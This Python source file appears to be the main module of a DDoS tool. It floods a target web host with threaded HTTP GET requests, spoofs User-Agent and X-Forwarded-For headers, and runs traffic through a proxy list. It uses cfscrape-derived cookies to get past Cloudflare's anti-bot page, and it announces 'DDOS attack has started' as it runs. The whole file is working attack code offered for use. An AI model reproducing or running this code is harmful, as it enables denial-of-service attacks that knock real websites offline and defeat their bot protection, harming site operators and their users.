# socket, urllib.request, ssl
import cfscrape # python module that allows you to bypass cloudflare's anti-bot page 
import _thread, threading, random 
from inspect import currentframe, getframeinfo # find the line on program
from usage_commands import usage 
from cloudflare_check import cloudflare
from time import sleep
from request_default_http import RequestDefaultHTTP
from request_default_https import RequestDefaultHTTPS
from request_proxy_http import RequestProxyHTTP
from cloudflare_check import check_cloudflare 
frame_info = getframeinfo(currentframe())


# Creation of http request if website is not protected from cloudflare 
def set_request():
    global request
    get_host = "GET /" + args.dir + " HTTP/1.1\r\nHost: " + args.host + "\r\n"
    useragent = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36\r\n"
    accept = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n"
    connection = "Connection: Keep-Alive\r\n"
    request = get_host + useragent + accept + \
              connection + "\r\n"
    request_list.append(request)


# Creation of http request if website is not protected from cloudflare 
def set_request_cf():
    global request_cf
    global proxy_ip
    global proxy_port
    cf_combine = random.choice(cf_token).strip().split("#")
    proxy_ip = cf_combine[0]
    proxy_port = cf_combine[1]
    get_host = "GET /" + args.dir + " HTTP/1.1\r\nHost: " + args.host + "\r\n"
    tokens_and_ua = cf_combine[2]
    accept = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n"
    randomip = str(random.randint(0, 255)) + "." + str(random.randint(0, 255)) + \
               "." + str(random.randint(0, 255)) + "." + str(random.randint(0, 255))
    forward = "X-Forwarded-For: " + randomip + "\r\n"
    connection = "Connection: Keep-Alive\r\n"
    request_cf = get_host + tokens_and_ua + accept + forward + connection + "\r\n"



# generate the cf_token to bypass the cloudflare anti-bot 
def generate_cf_token(i):
    proxy = proxy_list[i].strip().split(":") 
    try:
        proxies = {"http": "http://" + proxy[0] + ":" + proxy[1]}
        scraper = cfscrape.create_scraper()
        cookie_value, user_agent = scraper.get_cookie_string(url, proxies=proxies)
        cookie_value_string = "Cookie: " + cookie_value + "\r\n"
        user_agent_string = "User-Agent: " + user_agent + "\r\n"
        cf_token.append(proxy[0] + "#" + proxy[1] + "#" + cookie_value_string + user_agent_string)
    except:
        print("`cf_token` is not generated")


# Reading and writing of data from proxy file in proxy_list array
def proxyget():
    proxy_file = open(args.proxy_file, "r")
    line = proxy_file.readline().rstrip()
    while line:
        proxy_list.append(line)
        line = proxy_file.readline().rstrip()
    proxy_file.close()


def main():
    if args.proxy_file is not None:
        proxyget()
    global go
    global x
    x = 0
    go = threading.Event() 

    output = f"Server {args.host} is protected by cloudflare" if check_cloudflare(url) else f"Server {args.host} is not protected by cloudflare"


    if cloudflare(url):
        # print("[*] Server ", args.host, " found cloudflare to website ")
        print(output)
        for i in range(args.threads):
            _thread.start_new_thread(generate_cf_token, (i,))  # calculate CF token
        sleep(5)
        print("[*] DDOS attack has started ")
        for x in range(args.threads):
            set_request_cf()
            RequestProxyHTTP(proxy_ip, proxy_port, request_cf, args, x + 1, go, frame_info).start()  # FIXME:
            # self, proxy_ip, proxy_port, request_cf, args, counter, go, frame_info
        go.set()
    else:
        # print("[*] Server", args.host, " didn't find cloudflare to website ") 
        print(output)
        for x in range(args.threads):
            _thread.start_new_thread(set_request, ())  #
        sleep(5)
        print("[*] DDOS attack started")
        for x in range(args.threads):
            request = random.choice(request_list)
            if args.ssl:
                RequestDefaultHTTP(request, args, x + 1, go, frame_info).start()  
                # request, args, counter, go ,frame_info
            else:
                RequestDefaultHTTPS(request, args, x + 1, go, frame_info).start()  
                # request, args, counter, go ,frame_info
        go.set()


if __name__ == "__main__":
    args = usage()

    request_list = []
    proxy_list = []
    cf_token = []

    if args.ssl:
        url = "http://" + args.host
    else:
        url = "https://" + args.host

    main()
